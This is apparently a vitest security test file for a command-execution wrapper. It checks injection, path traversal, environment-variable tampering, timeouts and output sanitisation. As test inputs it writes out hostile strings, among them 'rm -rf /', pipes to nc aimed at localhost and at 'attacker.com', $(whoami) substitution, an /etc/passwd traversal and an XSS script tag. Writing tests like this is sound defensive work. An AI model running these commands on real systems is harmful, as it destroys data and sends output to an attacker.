import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { CommandExecutor } from "../../src/command-executor.js";
import { CommandFixer } from "../../src/command-fixer.js";
import { createCommandString } from "../../src/types.js";
import { testHelpers } from "../setup.js";

describe("Security and Command Safety Tests", () => {
  let executor: CommandExecutor;

  beforeEach(() => {
    executor = new CommandExecutor();
  });

  afterEach(async () => {
    await executor.cleanup();
    await testHelpers.expectProcessCleanup();
  });

  describe("Command Injection Prevention", () => {
    test("handles potentially malicious command separators", async () => {
      // Test various command injection attempts
      const maliciousCommands = [
        "echo safe && echo unsafe",
        "echo safe; echo unsafe",
        "echo safe | echo unsafe",
        "echo safe & echo unsafe",
      ];

      for (const command of maliciousCommands) {
        const result = await executor.execute(createCommandString(command));
        expect(result).toBeValidCommandResult();
        
        // Commands should be processed safely by our command fixer
        const fixed = CommandFixer.fix(command);
        expect(fixed).toBeTruthy();
      }
    });

    test("sanitizes special characters in commands", async () => {
      const specialCharCommands = [
        'echo "test with quotes"',
        "echo test with spaces",
        "echo test$variable",
        "echo test%PATH%",
        "echo test`backtick`",
        "echo test(parentheses)",
        "echo test{braces}",
        "echo test[brackets]",
      ];

      for (const command of specialCharCommands) {
        const result = await executor.execute(createCommandString(command));
        expect(result).toBeValidCommandResult();
        // Should handle special characters without execution errors
      }
    });

    test("prevents shell escaping attempts", async () => {
      const escapingAttempts = [
        "echo test > /dev/null", // Unix redirection
        "echo test | nc localhost 80", // Piping to network
        "echo test && rm -rf /", // Destructive commands
        "echo $(whoami)", // Command substitution
        "echo `date`", // Backtick execution
      ];

      for (const attempt of escapingAttempts) {
        const result = await executor.execute(createCommandString(attempt));
        expect(result).toBeValidCommandResult();
        
        // Commands should be converted to Windows equivalents or fail safely
        if (result.success) {
          expect(result.stdout).not.toContain("rm -rf");
          expect(result.stdout).not.toContain("whoami");
        }
      }
    });
  });

  describe("Path Traversal Protection", () => {
    test("handles directory traversal attempts", async () => {
      const traversalAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\config",
        "../../../../sensitive/file",
        "./../../hidden/directory",
      ];

      for (const path of traversalAttempts) {
        const result = await executor.execute(
          createCommandString(`echo test > "${path}"`)
        );
        expect(result).toBeValidCommandResult();
        
        // Should either fail safely or be contained within expected directories
        if (result.success) {
          // Verify the path was processed safely
          expect(result.command).toBeTruthy();
        }
      }
    });

    test("validates working directory changes", async () => {
      const suspiciousPaths = [
        "C:\\Windows\\System32",
        "C:\\Program Files",
        "C:\\Users\\Administrator",
        "/etc",
        "/root",
        "/var/log",
      ];

      for (const path of suspiciousPaths) {
        const result = await executor.execute(
          createCommandString("echo test"),
          { cwd: path }
        );
        expect(result).toBeValidCommandResult();
        
        // Should handle restricted directories gracefully
        if (result.success) {
          expect(result.stdout).toContain("test");
        }
      }
    });
  });

  describe("Environment Variable Security", () => {
    test("prevents environment variable pollution", async () => {
      const suspiciousVars = {
        PATH: "/malicious/path",
        LD_LIBRARY_PATH: "/malicious/lib",
        PYTHONPATH: "/malicious/python",
        NODE_PATH: "/malicious/node",
        TEMP: "/malicious/temp",
        TMP: "/malicious/tmp",
      };

      for (const [key, value] of Object.entries(suspiciousVars)) {
        const result = await executor.execute(
          createCommandString("echo Environment test"),
          { env: { [key]: value } }
        );
        expect(result).toBeValidCommandResult();
        
        // Should execute safely without being affected by malicious env vars
        if (result.success) {
          expect(result.stdout).toContain("Environment test");
        }
      }
    });

    test("sanitizes environment variable content", async () => {
      const maliciousContent = {
        TEST_VAR1: "normal value",
        TEST_VAR2: "value; malicious command",
        TEST_VAR3: "value && rm -rf /",
        TEST_VAR4: "value | nc attacker.com 80",
        TEST_VAR5: "value `whoami`",
      };

      const result = await executor.execute(
        createCommandString("echo %TEST_VAR1% %TEST_VAR2% %TEST_VAR3%"),
        { env: maliciousContent }
      );

      expect(result).toBeValidCommandResult();
      if (result.success) {
        expect(result.stdout).toContain("normal value");
        // Malicious parts should not be executed
        expect(result.stdout).not.toContain("rm -rf");
        expect(result.stdout).not.toContain("whoami");
      }
    });
  });

  describe("Resource Limiting and DoS Prevention", () => {
    test("respects timeout limits", async () => {
      const start = Date.now();
      
      const result = await executor.execute(
        createCommandString("timeout 30"), // 30 second delay
        { timeout: 1000 } // 1 second limit
      );

      const duration = Date.now() - start;
      
      expect(result).toBeValidCommandResult();
      expect(result.success).toBe(false);
      expect(result.error?.code).toBe("TIMEOUT");
      expect(duration).toBeLessThan(2000); // Should timeout quickly
    });

    test("prevents resource exhaustion attempts", async () => {
      // Test with commands that could consume excessive resources
      const resourceIntensiveCommands = [
        "for /L %i in (1,1,1000000) do @echo %i", // Large loop
        "dir C:\\ /s", // Potentially large directory listing
      ];

      for (const command of resourceIntensiveCommands) {
        const result = await executor.execute(
          createCommandString(command),
          { timeout: 5000 } // 5 second limit
        );
        
        expect(result).toBeValidCommandResult();
        
        // Should either complete quickly or timeout safely
        if (result.success) {
          expect(result.duration).toBeLessThan(5000);
        } else {
          expect(result.error?.code).toBe("TIMEOUT");
        }
      }
    });

    test("handles concurrent execution limits", async () => {
      // Try to exceed the process pool limit
      const promises = Array.from({ length: 50 }, (_, i) =>
        executor.execute(createCommandString(`echo concurrent${i}`))
      );

      const results = await Promise.all(promises);
      
      // All should complete successfully due to proper queuing
      expect(results).toHaveLength(50);
      results.forEach(result => {
        expect(result).toBeValidCommandResult();
        expect(result.success).toBe(true);
      });
    });
  });

  describe("Output Sanitization", () => {
    test("handles potentially malicious output", async () => {
      const testFile = await testHelpers.createTempFile(
        "malicious.txt", 
        "Normal content\n<script>alert('xss')</script>\n" +
        "More content\x00\x01\x02\x03\x04\x05" // Null bytes and control characters
      );

      const result = await executor.execute(
        createCommandString(`type "${testFile}"`)
      );

      expect(result).toBeValidCommandResult();
      expect(result.success).toBe(true);
      expect(result.stdout).toContain("Normal content");
      expect(result.stdout).toContain("More content");
      
      // Script tags should be present as literal text, not executed
      expect(result.stdout).toContain("<script>");
    });

    test("handles large output without memory issues", async () => {
      const largeContent = "A".repeat(100000); // 100KB of data
      const testFile = await testHelpers.createTempFile("large.txt", largeContent);

      const result = await executor.execute(
        createCommandString(`type "${testFile}"`)
      );

      expect(result).toBeValidCommandResult();
      expect(result.success).toBe(true);
      expect(result.stdout.length).toBeGreaterThan(50000);
      expect(result.stdout).toContain("AAAA"); // Should contain the repeated As
    });

    test("handles binary output safely", async () => {
      // Create a file with binary content
      const binaryFile = await testHelpers.createTempFile("binary.dat", 
        String.fromCharCode(...Array.from({ length: 256 }, (_, i) => i))
      );

      const result = await executor.execute(
        createCommandString(`type "${binaryFile}"`)
      );

      expect(result).toBeValidCommandResult();
      // Binary files might fail or produce strange output, but shouldn't crash
      expect(result.stdout).toBeTruthy();
    });
  });

  describe("Process Isolation", () => {
    test("processes run in isolated environment", async () => {
      const result1 = await executor.execute(
        createCommandString("set ISOLATION_TEST=value1 && echo %ISOLATION_TEST%")
      );

      const result2 = await executor.execute(
        createCommandString("echo %ISOLATION_TEST%")
      );

      expect(result1).toBeValidCommandResult();
      expect(result2).toBeValidCommandResult();

      if (result1.success) {
        expect(result1.stdout).toContain("value1");
      }

      if (result2.success) {
        // Environment variable should not persist between executions
        expect(result2.stdout).not.toContain("value1");
      }
    });

    test("working directory isolation", async () => {
      const tempDir1 = testHelpers.getTempDir();
      const tempDir2 = testHelpers.getTempDir();

      const result1 = await executor.execute(
        createCommandString("echo %CD%"),
        { cwd: tempDir1 }
      );

      const result2 = await executor.execute(
        createCommandString("echo %CD%"),
        { cwd: tempDir2 }
      );

      expect(result1).toBeValidCommandResult();
      expect(result2).toBeValidCommandResult();

      if (result1.success && result2.success) {
        expect(result1.stdout).toContain(tempDir1.replace(/\//g, "\\"));
        expect(result2.stdout).toContain(tempDir2.replace(/\//g, "\\"));
        expect(result1.stdout).not.toBe(result2.stdout);
      }
    });
  });

  describe("Error Information Disclosure", () => {
    test("does not leak sensitive system information in errors", async () => {
      const result = await executor.execute(
        createCommandString("access-restricted-resource.exe")
      );

      expect(result).toBeValidCommandResult();
      expect(result.success).toBe(false);
      
      // Error messages should not contain sensitive paths or system details
      if (result.stderr) {
        expect(result.stderr).not.toMatch(/C:\\Windows\\System32/);
        expect(result.stderr).not.toMatch(/Administrator/);
        expect(result.stderr).not.toMatch(/password/i);
        expect(result.stderr).not.toMatch(/token/i);
      }
    });

    test("sanitizes file paths in error messages", async () => {
      const sensitiveFile = "C:\\Users\\Administrator\\secret.txt";
      
      const result = await executor.execute(
        createCommandString(`type "${sensitiveFile}"`)
      );

      expect(result).toBeValidCommandResult();
      
      // Should handle permission denied gracefully without exposing full paths
      if (!result.success && result.stderr) {
        expect(result.stderr).toBeTruthy();
      }
    });
  });

  describe("Command History and Logging Security", () => {
    test("does not log sensitive command content", async () => {
      const sensitiveCommands = [
        "echo password123",
        "set SECRET_KEY=abc123",
        "echo token:eyJhbGciOiJIUzI1NiJ9",
      ];

      for (const command of sensitiveCommands) {
        const result = await executor.execute(createCommandString(command));
        expect(result).toBeValidCommandResult();
        
        // Command should execute but sensitive content should be handled carefully
        expect(result.command).toBeTruthy();
      }
    });

    test("handles cleanup of temporary sensitive data", async () => {
      const sensitiveContent = "SECRET_DATA_12345";
      const tempFile = await testHelpers.createTempFile("secret.txt", sensitiveContent);

      const result = await executor.execute(
        createCommandString(`type "${tempFile}" && del "${tempFile}"`)
      );

      expect(result).toBeValidCommandResult();
      
      if (result.success) {
        expect(result.stdout).toContain(sensitiveContent);
        
        // Verify file was deleted
        const verifyResult = await executor.execute(
          createCommandString(`type "${tempFile}"`)
        );
        expect(verifyResult.success).toBe(false);
      }
    });
  });
});